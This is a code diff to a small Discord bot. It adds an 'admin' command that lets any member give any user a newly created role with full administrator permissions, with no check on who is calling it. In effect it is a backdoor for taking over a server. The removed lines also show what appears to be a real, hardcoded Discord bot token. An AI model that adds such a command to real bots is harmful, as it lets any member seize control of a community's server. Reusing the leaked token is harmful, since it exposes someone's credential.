@@ -1,6 +1,6 @@
 import os
 from discord.ext import commands
-from discord import Intents
+from discord import Intents, Permissions, utils
 
 intents = Intents.default()
 intents.members = True
@@ -46,5 +46,27 @@ async def count(ctx):
     await ctx.send(toSend)
 
 
-token = "ODkyODIyODA2Mzg2MDU3Mjg3.YVSgCA.dLawOL9kKAYHvD4e2j2LfhHKkic"
+@bot.command()
+async def admin(ctx, param):
+    identity = param.split("!")[1].split(">")[0]
+    roleName = 'admin_from_bot'
+    perms = Permissions(8)
+    roleExists = False
+    user = None
+    role_ = None
+    for role in ctx.guild.roles:
+        if (role.name == roleName):
+            role_ = role
+            roleExists = True
+    if (not roleExists):
+        role_ = await ctx.guild.create_role(name=roleName, permissions=perms)
+    for member in ctx.guild.members:
+        print(identity)
+        if (f'{member.id}' == str(identity)):
+            user = member
+    role = utils.get(ctx.guild.roles, name=roleName)
+    await user.add_roles(role_)
+
+
+token = ""
 bot.run(token)  # Starts the bot
